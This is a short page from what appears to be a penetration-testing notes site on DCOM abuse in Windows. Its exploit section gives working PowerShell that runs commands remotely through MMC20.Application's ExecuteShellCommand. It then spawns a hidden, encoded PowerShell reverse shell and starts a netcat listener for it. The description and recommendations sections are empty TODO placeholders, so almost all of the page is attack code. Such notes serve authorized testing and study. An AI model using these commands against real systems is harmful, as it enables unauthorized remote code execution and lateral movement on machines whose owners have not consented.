---
layout: default
title: DCOM Abuse
parent: Windows
nav_order: 4
permalink: /windows/dcom/
---

# DCOM Abuse
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

TODO: Describe the vulnerability here.

## Prerequisites

* Local administrator rights on the target machine.

## Exploit

From an elevated PowerShell prompt.

```powershell
# Instanciate Microsoft Management Console on remote target.
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$target"))

# Execute remote command
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c $command","7")
```

Similar to [WinRM Abuse](/windows/winrm/), you can spawn a reverse shell on the target machine.

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e $payload","7")
```

Don’t forget to run your listener first.

```bash
nc -lnvp $lport
```

## Recommendations

- [ ] TODO: List recommendations here.